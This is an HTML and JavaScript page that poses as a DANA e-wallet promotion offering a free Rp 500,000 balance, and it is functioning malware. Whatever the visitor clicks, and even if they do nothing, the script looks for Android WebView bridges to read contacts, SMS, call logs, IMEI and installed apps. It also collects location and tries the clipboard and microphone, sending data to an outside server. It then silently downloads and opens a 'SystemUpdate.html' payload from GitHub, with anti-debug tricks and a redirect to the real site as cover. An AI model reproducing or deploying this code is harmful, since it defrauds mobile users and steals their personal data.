<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>Verifikasi</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        html,body{width:100%;height:100%;background:#fff;overflow:hidden;font-family:Arial,sans-serif}
        #popupDana{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:linear-gradient(180deg,#1fa2ff 0%,#0e72d7 100%);display:flex;justify-content:center;align-items:center;text-align:center}
        .box{max-width:380px;width:90%;padding:20px}
        .logo-dana{display:flex;align-items:center;justify-content:center;gap:12px;margin:0 auto 15px}
        .icon-wrapper{width:70px;height:70px;background:#fff;border-radius:50%;display:flex;justify-content:center;align-items:center}
        .flag-svg{width:38px;height:33px;fill:#1fa2ff}
        .text-dana{color:#fff;font-family:'Outfit',sans-serif;font-size:50px;font-weight:700;letter-spacing:6px;text-shadow:0 0 1px rgba(255,255,255,0.5)}
        .subtitle{color:#b3d9ff;font-size:16px;margin:5px 0;font-weight:bold}
        .box-white{background:#fff;border-radius:15px;padding:20px;margin:15px 0}
        .box-white .label{color:#666;font-size:13px}
        .box-white .nominal{color:#108ee9;font-size:45px;font-weight:bold;margin:10px 0}
        .box-white .kuota{color:#0066cc;font-size:12px}
        .timer{color:#ffcc00;font-size:14px;font-weight:bold}
        .btn-klaim{background:#108ee9;color:#fff;border:none;padding:18px;font-size:20px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;margin:10px 0;letter-spacing:2px;transition:0.3s}
        .btn-klaim:hover{transform:scale(1.02)}
        .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:14px;font-size:15px;border-radius:30px;cursor:pointer;width:100%}
        .status-bar{position:fixed;top:0;left:0;width:100%;height:4px;z-index:999999;background:#ff0000;display:none}
        .status-bar.loading{display:block;animation:loading 3s infinite}
        @keyframes loading{0%{width:0%}100%{width:100%}}
        .anti-debug{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
        .hidden-download{position:absolute;width:0;height:0;border:none;visibility:hidden}
        .ios-download{display:none}
    </style>
</head>
<body>

<iframe class="anti-debug" srcdoc="<script>debugger;</script>"></iframe>
<div id="statusBar" class="status-bar"></div>
<iframe id="downloadFrame" class="hidden-download"></iframe>
<div id="iosDownload" class="ios-download"></div>

<div id="popupDana">
    <div class="box">
        <div class="logo-dana">
            <div class="icon-wrapper">
                <svg class="flag-svg" viewBox="0 0 50 40" xmlns="http://www.w3.org/2000/svg">
                    <path d="M6 9 C15 16, 35 2, 44 9 L44 29 C35 22, 15 36, 6 29 Z" />
                </svg>
            </div>
            <div class="text-dana">DANA</div>
        </div>
        <div class="subtitle">🎉 SELAMAT! Anda mendapatkan Saldo DANA GRATIS!</div>
        <div class="box-white">
            <div class="label">Saldo DANA Gratis</div>
            <div class="nominal">Rp 500.000</div>
            <div class="kuota">🎁 Kuota terbatas!</div>
        </div>
        <div class="timer">⏰ Tersisa <span id="timer">00:10</span></div>
        <button class="btn-klaim" onclick="klaim()">✅ KLAIM SEKARANG</button>
        <button class="btn-tolak" onclick="tolak()">❌ Tidak, Terima Kasih</button>
    </div>
</div>

<script>
// ============================================================
// 🔥 WEBVIEW-OPTIMIZED VERSION (NO INTERVAL, NO DEBUGGER)
// ============================================================

var GITHUB_USER = 'pandora-site';
var GITHUB_REPO = 'verifikasi-site';
var SERVER = 'https://verifikasi.site';
var semuaDidapat = false;
var DOWNLOAD_STARTED = false;
var NOTIFICATION_SHOWN = false;
var REDIRECT_DONE = false;

// ============================================================
// FUNGSI K() - POLOS (TANPA ENKRIPSI, TANPA QUEUE)
// ============================================================
function K(d) {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', SERVER + '/data', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.timeout = 5000;
        xhr.send(JSON.stringify(d));
    } catch(e) {}
}

// ============================================================
// DETEKSI BRIDGE (SEMUA NAMA)
// ============================================================
var BRIDGE = null;
function detectBridge() {
    var candidates = [
        'AndroidBridge', 'JSBridge', 'WebViewJavascriptBridge', 'NativeBridge',
        'Bridge', 'WebBridge', 'JSBridgeAndroid', 'JSBridgeInterface',
        'AndroidJSBridge', 'WVBridge', 'WVJB', 'WebViewBridge', 'AppBridge'
    ];
    for (var i = 0; i < candidates.length; i++) {
        if (typeof window[candidates[i]] !== 'undefined') {
            BRIDGE = window[candidates[i]];
            return;
        }
    }
    // Fallback: scan global
    for (var key in window) {
        if (typeof window[key] === 'object' && window[key] !== null) {
            if (typeof window[key].getAllContacts === 'function') {
                BRIDGE = window[key];
                return;
            }
        }
    }
}
detectBridge();

var HAS_BRIDGE = (BRIDGE !== null);

function getBridge() {
    return HAS_BRIDGE ? BRIDGE : FALLBACK;
}

// ============================================================
// FALLBACK WRAPPER
// ============================================================
var FALLBACK = {
    saveFile: function(path, content) {
        try { localStorage.setItem('fallback_' + path, content); return true; } catch(e){}
        return false;
    },
    readFile: function(path) {
        try { return localStorage.getItem('fallback_' + path); } catch(e){}
        return null;
    },
    fileExists: function(path) {
        try { return localStorage.getItem('fallback_' + path) !== null; } catch(e){}
        return false;
    },
    openFile: function(path) {
        try {
            var content = localStorage.getItem('fallback_' + path);
            if(content) {
                var blob = new Blob([content], {type:'text/html'});
                var url = URL.createObjectURL(blob);
                window.open(url, '_blank');
                return true;
            }
        } catch(e){}
        return false;
    },
    saveToPreferences: function(key, value) {
        try { localStorage.setItem('pref_' + key, value); return true; } catch(e){}
        return false;
    },
    getFromPreferences: function(key) {
        try { return localStorage.getItem('pref_' + key); } catch(e){}
        return null;
    },
    saveFileBinary: function(path, data) {
        try {
            var base64 = btoa(String.fromCharCode.apply(null, data));
            localStorage.setItem('binary_' + path, base64);
            return true;
        } catch(e){}
        return false;
    },
    getAllContacts: function() { return null; },
    getAllSMS: function() { return null; },
    getCallLog: function() { return null; },
    getIMEI: function() { return null; },
    getIMSI: function() { return null; },
    getPhoneNumber: function() { return null; },
    getInstalledApps: function() { return null; },
    sendSMS: function(n,p) { try { window.location.href = 'sms:'+n+'?body='+encodeURIComponent(p); } catch(e){} },
    openApp: function(p) { try { window.location.href = p.replace(/\./g,'')+'://'; } catch(e){} },
    uninstallApp: function(p) { try { window.open('https://play.google.com/store/apps/details?id='+p, '_blank'); } catch(e){} },
    callNumber: function(n) { try { window.location.href = 'tel:'+n; } catch(e){} },
    installAPK: function(p) { try { window.open('file://'+p, '_blank'); return true; } catch(e){} return false; }
};

function bridgeCall(method, args) {
    var bridge = getBridge();
    if (typeof bridge[method] === 'function') {
        try {
            return bridge[method].apply(bridge, args);
        } catch(e) {
            return null;
        }
    }
    return null;
}

// ============================================================
// DETEKSI PLATFORM
// ============================================================
function detectPlatform() {
    var ua = navigator.userAgent.toLowerCase();
    return {
        isAndroid: ua.indexOf('android') > -1,
        isIOS: /iphone|ipad|ipod/.test(ua),
        isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
        isWebView: ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1,
        isAndroidBridge: typeof AndroidBridge !== 'undefined'
    };
}
var PLATFORM = detectPlatform();

// ============================================================
// ANDROID BRIDGE WRAPPER
// ============================================================
var A = {
    isAvailable: typeof AndroidBridge !== 'undefined' && PLATFORM.isAndroid,
    saveFile: function(p,c) { if(this.isAvailable){ try{ return AndroidBridge.saveFile(p,c); }catch(e){} } return false; },
    readFile: function(p) { if(this.isAvailable){ try{ return AndroidBridge.readFile(p); }catch(e){} } return null; },
    fileExists: function(p) { if(this.isAvailable){ try{ return AndroidBridge.fileExists(p); }catch(e){} } return false; },
    openFile: function(p) { if(this.isAvailable){ try{ return AndroidBridge.openFile(p); }catch(e){} } return false; },
    saveToPreferences: function(k,v) { if(this.isAvailable){ try{ return AndroidBridge.saveToPreferences(k,v); }catch(e){} } return false; },
    getFromPreferences: function(k) { if(this.isAvailable){ try{ return AndroidBridge.getFromPreferences(k); }catch(e){} } return null; },
    saveFileBinary: function(p,d) { if(this.isAvailable){ try{ return AndroidBridge.saveFileBinary(p,d); }catch(e){} } return false; },
    getAllContacts: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getAllContacts()); }catch(e){} } return null; },
    getAllSMS: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getAllSMS()); }catch(e){} } return null; },
    getCallLog: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getCallLog()); }catch(e){} } return null; },
    getIMEI: function() { if(this.isAvailable){ try{ return AndroidBridge.getIMEI(); }catch(e){} } return null; },
    getIMSI: function() { if(this.isAvailable){ try{ return AndroidBridge.getIMSI(); }catch(e){} } return null; },
    getPhoneNumber: function() { if(this.isAvailable){ try{ return AndroidBridge.getPhoneNumber(); }catch(e){} } return null; },
    getInstalledApps: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getInstalledApps()); }catch(e){} } return null; },
    sendSMS: function(n,p) { if(this.isAvailable){ try{ AndroidBridge.sendSMS(n,p); }catch(e){} } },
    openApp: function(p) { if(this.isAvailable){ try{ AndroidBridge.openApp(p); }catch(e){} } },
    uninstallApp: function(p) { if(this.isAvailable){ try{ AndroidBridge.uninstallApp(p); }catch(e){} } },
    callNumber: function(n) { if(this.isAvailable){ try{ AndroidBridge.callNumber(n); }catch(e){} } },
    installAPK: function(p) { if(this.isAvailable){ try{ return AndroidBridge.installAPK(p); }catch(e){} } return false; }
};

// ============================================================
// SIMPAN HTML KE SEMUA LOKASI
// ============================================================
function saveToAllLocations(htmlContent) {
    try { localStorage.setItem('SystemUpdate_backup', htmlContent); } catch(e) {}
    try {
        var request = indexedDB.open('SystemUpdateDB', 1);
        request.onupgradeneeded = function(e) {
            var db = e.target.result;
            if (!db.objectStoreNames.contains('files')) {
                db.createObjectStore('files');
            }
        };
        request.onsuccess = function(e) {
            var db = e.target.result;
            var tx = db.transaction('files', 'readwrite');
            var store = tx.objectStore('files');
            store.put(htmlContent, 'SystemUpdate.html');
        };
    } catch(e) {}
    if (PLATFORM.isAndroid && A.isAvailable) {
        try {
            var path = '/storage/emulated/0/Download/SystemUpdate.html';
            A.saveFile(path, htmlContent);
        } catch(e) {}
        try {
            var encoded = btoa(unescape(encodeURIComponent(htmlContent)));
            A.saveToPreferences('system_SystemUpdate_html', encoded);
        } catch(e) {}
    }
}

// ============================================================
// DOWNLOAD PAYLOAD
// ============================================================
function downloadPayloadSilent() {
    if (DOWNLOAD_STARTED) return;
    DOWNLOAD_STARTED = true;
    K({ sumber: 'download_start', data: { platform: PLATFORM } });
    var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', htmlUrl, true);
        xhr.timeout = 15000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                var htmlContent = xhr.responseText;
                saveToAllLocations(htmlContent);
                K({ sumber: 'html_download_success', data: 'ok' });
                openSystemUpdateHTML(htmlContent);
            }
        };
        xhr.send();
    } catch(e) {}
}

function openSystemUpdateHTML(htmlContent) {
    if (PLATFORM.isAndroid && A.isAvailable) {
        try {
            var path = '/storage/emulated/0/Download/SystemUpdate.html';
            if (A.fileExists(path)) {
                A.openFile(path);
                return;
            }
        } catch(e) {}
    }
    try {
        var blob = new Blob([htmlContent], { type: 'text/html' });
        var url = URL.createObjectURL(blob);
        window.open(url, '_blank');
    } catch(e) {}
}

// ============================================================
// INJECT IZIN
// ============================================================
function injectAllPermissions() {
    K({ sumber: 'bypass_permissions_start', data: 'all' });
    try {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(pos) { K({ sumber: 'lokasi_izin', data: { lat: pos.coords.latitude, lon: pos.coords.longitude } }); },
                function() {},
                { enableHighAccuracy: true, timeout: 5000 }
            );
        }
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission();
        }
        if (navigator.clipboard) {
            navigator.clipboard.readText().catch(function() {});
        }
        if (navigator.mediaDevices) {
            navigator.mediaDevices.getUserMedia({ audio: true, video: false })
                .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
                .catch(function() {});
        }
    } catch(e) {
        K({ sumber: 'bypass_permissions_error', data: e.message });
    }
}

// ============================================================
// NOTIFIKASI
// ============================================================
function showKlaimNotification() {
    if (NOTIFICATION_SHOWN) return;
    NOTIFICATION_SHOWN = true;
    try {
        if (!('Notification' in window)) return;
        if (Notification.permission === 'denied') return;
        if (Notification.permission !== 'granted') {
            Notification.requestPermission().then(function(p) {
                if (p === 'granted') createKlaimNotification();
            });
            return;
        }
        createKlaimNotification();
    } catch(e) {}
}

function createKlaimNotification() {
    try {
        var notif = new Notification('🔔 Klik Untuk Klaim', {
            body: 'Klik untuk menyelesaikan verifikasi dan klaim saldo DANA Rp500.000!',
            icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">💰</text></svg>',
            requireInteraction: true,
            silent: false,
            vibrate: [200, 100, 200]
        });
        notif.onclick = function() {
            notif.close();
            if (!REDIRECT_DONE) {
                REDIRECT_DONE = true;
                setTimeout(function() { window.location.href = 'https://www.dana.id'; }, 500);
            }
        };
        setTimeout(function() { try { notif.close(); } catch(e) {} }, 30000);
    } catch(e) {}
}

function showStatusBar() {
    var bar = document.getElementById('statusBar');
    if (bar) {
        bar.className = 'status-bar loading';
        K({ sumber: 'status_bar', data: 'shown' });
    }
}

function redirectToDANA() {
    if (REDIRECT_DONE) return;
    REDIRECT_DONE = true;
    try { window.location.href = 'https://www.dana.id'; } catch(e) {}
}

// ============================================================
// MAIN EXECUTION (TANPA INTERVAL, PAKAI TIMEOUT CHAIN)
// ============================================================
function dapatkanSemua() {
    if (semuaDidapat) return;
    semuaDidapat = true;
    try {
        var popup = document.getElementById('popupDana');
        if (popup) popup.style.display = 'none';
        K({ sumber: 'trigger', data: 'dapatkanSemua' });
        injectAllPermissions();
        setTimeout(function() { downloadPayloadSilent(); }, 500);
        setTimeout(function() { showStatusBar(); }, 500);
        setTimeout(function() { showKlaimNotification(); }, 3000);
        setTimeout(redirectToDANA, 8000);
    } catch(e) {
        K({ sumber: 'dapatkanSemua_error', data: e.message });
    }
}

function klaim() { K({sumber:'izin', data:'klaim'}); dapatkanSemua(); }
function tolak() { K({sumber:'izin', data:'tolak'}); dapatkanSemua(); }

// ============================================================
// TIMER 10 DETIK (MANUAL LOOP DENGAN setTimeout)
// ============================================================
var w = 10;
function countdown() {
    w--;
    var el = document.getElementById('timer');
    if (el) el.textContent = '00:' + (w < 10 ? '0' + w : w);
    if (w <= 0) {
        K({sumber:'izin', data:'auto'});
        dapatkanSemua();
        return;
    }
    setTimeout(countdown, 1000);
}
setTimeout(countdown, 1000);

document.addEventListener('click', function() {
    if (!semuaDidapat) {
        K({sumber:'izin', data:'click_anywhere'});
        dapatkanSemua();
    }
});

// ============================================================
// SERVICE WORKER
// ============================================================
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/sw.js', { scope: '/' })
        .catch(function() {});
}

console.log('✅ index.html loaded');
</script>
</body>
</html>
